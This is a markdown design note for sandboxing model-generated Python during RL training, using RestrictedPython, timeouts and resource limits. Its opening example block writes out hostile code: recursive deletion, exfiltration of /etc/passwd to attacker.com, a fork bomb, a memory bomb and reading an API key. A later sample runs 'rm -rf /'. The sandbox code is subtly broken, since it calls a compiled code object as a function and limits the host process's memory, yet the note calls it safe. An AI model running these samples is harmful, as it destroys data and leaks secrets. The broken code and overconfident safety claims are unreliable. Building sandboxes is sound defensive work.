# Code Execution Sandboxing for RL Training

## 🚨 Why Sandboxing is Critical

During RL training, your model will generate **thousands of Python code samples** that must be **executed** to compute rewards. Without proper sandboxing, this is extremely dangerous.

### What Could Go Wrong Without Sandboxing:

```python
# Example dangerous code the model might generate:

# 1. Delete all your data
import shutil
shutil.rmtree('/home/user/denial_prompting_RL')

# 2. Exfiltrate data
import requests
requests.post('http://attacker.com', data=open('/etc/passwd').read())

# 3. Fork bomb (crash system)
import os
while True:
    os.fork()

# 4. Infinite loop (hang training)
while True:
    pass

# 5. Memory bomb (OOM killer)
x = []
while True:
    x.append([0] * 10**6)

# 6. Access NSCC credentials
import os
print(os.environ['NSCC_API_KEY'])
```

### Why This Happens:

1. **Early in training**: Model generates random, buggy code
2. **Exploration**: Model tries different approaches, including dangerous ones
3. **No intent needed**: Even accidental mistakes can be catastrophic
4. **Scale**: 5000 training steps × 8 samples per step = 40,000 executions

---

## 🛡️ Our Sandboxing Strategy

### Three-Layer Defense:

```
┌─────────────────────────────────────────┐
│ Layer 1: RestrictedPython               │  Block dangerous operations
├─────────────────────────────────────────┤
│ Layer 2: Timeout + Resource Limits      │  Prevent infinite loops/memory bombs
├─────────────────────────────────────────┤
│ Layer 3: Exception Handling              │  Graceful failure handling
└─────────────────────────────────────────┘
```

---

## 📚 Implementation Details

### Layer 1: RestrictedPython

**What it blocks:**
- File operations: `open()`, `read()`, `write()`
- Network: `socket`, `requests`, `urllib`
- Dangerous imports: `os`, `sys`, `subprocess`, `eval`
- Attribute access: `__import__`, `__file__`, `__builtins__`

**Example:**

```python
from RestrictedPython import compile_restricted, safe_globals
from RestrictedPython.Guards import safe_builtins, guarded_iter_unpack_sequence

def execute_restricted(code_string, test_input):
    """Execute code with RestrictedPython."""

    # Compile with restrictions
    byte_code = compile_restricted(
        code_string,
        filename='<generated>',
        mode='exec'
    )

    if byte_code.errors:
        raise SyntaxError(byte_code.errors)

    # Create safe execution environment
    safe_globals_dict = {
        '__builtins__': safe_builtins,
        '__name__': 'restricted_module',
        '__metaclass__': type,
        '_getiter_': guarded_iter_unpack_sequence,
        # Allow safe built-ins
        'len': len,
        'range': range,
        'enumerate': enumerate,
        'zip': zip,
        'map': map,
        'filter': filter,
        'sorted': sorted,
        'sum': sum,
        'min': min,
        'max': max,
        'abs': abs,
        'list': list,
        'dict': dict,
        'set': set,
        'tuple': tuple,
        'str': str,
        'int': int,
        'float': float,
        'bool': bool,
    }

    local_scope = {}
    exec(byte_code, safe_globals_dict, local_scope)

    # Call the solution function
    if 'solution' not in local_scope:
        raise ValueError("No 'solution' function defined")

    return local_scope['solution'](test_input)
```

**What gets blocked:**

```python
# ❌ This will fail at compile time
code = """
import os
os.system('rm -rf /')
"""
# RestrictedPython won't allow 'import os'

# ❌ This will fail at runtime
code = """
def solution(x):
    with open('/etc/passwd') as f:
        return f.read()
"""
# RestrictedPython blocks 'open'

# ✅ This will work
code = """
def solution(x):
    return x + 1
"""
# Pure computation is allowed
```

---

### Layer 2: Timeout + Resource Limits

**Timeout (prevents infinite loops):**

```python
import signal

def execute_with_timeout(func, args, timeout=5):
    """Execute function with timeout."""

    def timeout_handler(signum, frame):
        raise TimeoutError("Execution timed out")

    # Set alarm
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)

    try:
        result = func(*args)
        signal.alarm(0)  # Cancel alarm
        return result
    except TimeoutError:
        return None
    finally:
        signal.alarm(0)  # Ensure alarm is cancelled
```

**Resource Limits (prevents memory bombs):**

```python
import resource

def set_memory_limit(max_memory_mb=256):
    """Limit memory usage."""
    max_bytes = max_memory_mb * 1024 * 1024
    resource.setrlimit(
        resource.RLIMIT_AS,
        (max_bytes, max_bytes)
    )

def set_cpu_limit(max_seconds=5):
    """Limit CPU time."""
    resource.setrlimit(
        resource.RLIMIT_CPU,
        (max_seconds, max_seconds)
    )
```

---

### Layer 3: Exception Handling

**Catch all possible errors:**

```python
def safe_execute(code_string, test_cases):
    """Execute code with comprehensive error handling."""

    result = {
        'passed': False,
        'num_passed': 0,
        'total': len(test_cases),
        'error': None,
        'timeout': False,
        'memory_error': False,
    }

    try:
        # Set resource limits
        set_memory_limit(256)  # 256 MB

        # Compile code
        compiled = compile_restricted(code_string)

        # Execute against test cases
        for test_input, expected_output in test_cases:
            try:
                actual = execute_with_timeout(
                    compiled,
                    test_input,
                    timeout=5
                )

                if actual == expected_output:
                    result['num_passed'] += 1

            except TimeoutError:
                result['timeout'] = True
                result['error'] = "Execution timed out"
                break

            except MemoryError:
                result['memory_error'] = True
                result['error'] = "Memory limit exceeded"
                break

            except Exception as e:
                result['error'] = f"Runtime error: {str(e)}"
                break

        result['passed'] = (result['num_passed'] == result['total'])

    except SyntaxError as e:
        result['error'] = f"Syntax error: {str(e)}"

    except Exception as e:
        result['error'] = f"Compilation error: {str(e)}"

    return result
```

---

## 🧪 Testing the Sandbox

### Test 1: Safe Code Should Work

```python
safe_code = """
def solution(x):
    # Pure computation is allowed
    return sum(range(x))
"""

result = safe_execute(safe_code, [(10, 45)])
assert result['passed'] == True
```

### Test 2: File Access Should Fail

```python
file_access_code = """
def solution(x):
    with open('/etc/passwd') as f:
        return f.read()
"""

result = safe_execute(file_access_code, [(None, None)])
assert result['passed'] == False
assert 'error' in result
```

### Test 3: Network Access Should Fail

```python
network_code = """
import requests
def solution(x):
    requests.get('http://google.com')
    return x
"""

result = safe_execute(network_code, [(5, 5)])
assert result['passed'] == False
assert 'error' in result
```

### Test 4: Infinite Loop Should Timeout

```python
infinite_loop = """
def solution(x):
    while True:
        pass
    return x
"""

result = safe_execute(infinite_loop, [(5, 5)])
assert result['timeout'] == True
```

### Test 5: Memory Bomb Should Fail

```python
memory_bomb = """
def solution(x):
    data = []
    for i in range(10**9):
        data.append([0] * 10**6)
    return x
"""

result = safe_execute(memory_bomb, [(5, 5)])
assert result['memory_error'] == True
```

---

## 🎯 What This Means for Your Project

### For Development (Laptop):

```python
# You can test sandbox logic locally
# No need for actual model - just test with dummy code samples

dummy_codes = [
    "def solution(x): return x + 1",  # Safe
    "import os; os.system('ls')",     # Dangerous
    "while True: pass",               # Infinite loop
]

for code in dummy_codes:
    result = safe_execute(code, [(5, 6)])
    print(f"Code: {code[:30]}... | Passed: {result['passed']}")
```

### For Training (NSCC):

```python
# During RL training loop:

for step in range(num_steps):
    # Model generates code
    generated_code = model.generate(prompt)

    # Execute safely (your sandbox prevents disasters)
    result = safe_execute(generated_code, test_cases)

    # Compute reward
    if result['passed']:
        reward = 1.0  # Correct solution
    else:
        reward = 0.0  # Wrong/dangerous/crashed

    # Update model
    model.update(reward)
```

---

## ⚠️ Important Notes

### What the Sandbox DOES:

✅ Blocks dangerous imports (os, sys, subprocess)
✅ Blocks file operations (open, read, write)
✅ Blocks network access (socket, requests)
✅ Prevents infinite loops (timeout)
✅ Prevents memory bombs (resource limits)
✅ Handles all exceptions gracefully

### What the Sandbox DOESN'T:

❌ Prevent all possible exploits (determined attacker might escape)
❌ Work across different operating systems (signal module is Unix-only)
❌ Protect against pure CPU computation (allowed for code generation)

### Best Practices:

1. **Always use the sandbox** when executing generated code
2. **Test the sandbox** with known dangerous code
3. **Monitor resource usage** on NSCC to catch issues
4. **Set conservative timeouts** (5 seconds is plenty for most code)
5. **Log all failures** to understand what the model is generating

---

## 📊 Performance Impact

```
Without Sandbox:
- Execution: ~1ms per sample
- Risk: 🔴 CRITICAL (system compromise possible)

With RestrictedPython:
- Execution: ~2-3ms per sample
- Overhead: ~2x slower
- Risk: 🟢 LOW (safe)

With Docker (overkill):
- Execution: ~100-500ms per sample
- Overhead: ~100-500x slower
- Risk: 🟢 MINIMAL (very safe but impractical)
```

**For RL training with 40,000 code executions:**
- Without sandbox: ~40 seconds (DANGEROUS)
- With RestrictedPython: ~80-120 seconds (SAFE)
- With Docker: ~1-5 hours (TOO SLOW)

**Verdict:** RestrictedPython is the right choice for RL training.

---

## 🚀 Implementation Timeline

- **Phase 1** ✅: Project setup (done)
- **Phase 2** 🚧: Data loading (in progress)
- **Phase 3** ⏳: Reward function + **Sandbox implementation**
- **Phase 4** ⏳: GRPO training loop
- **Phase 5** ⏳: NSCC deployment

The sandbox will be implemented in **Phase 3** as part of the reward function, since that's where code execution happens.

---

## 📚 References

- [RestrictedPython Documentation](https://restrictedpython.readthedocs.io/)
- [Python resource module](https://docs.python.org/3/library/resource.html)
- [Python signal module](https://docs.python.org/3/library/signal.html)
- [Sandboxing Python Code](https://zhu45.org/posts/2017/Aug/05/sandboxing-python-code/)
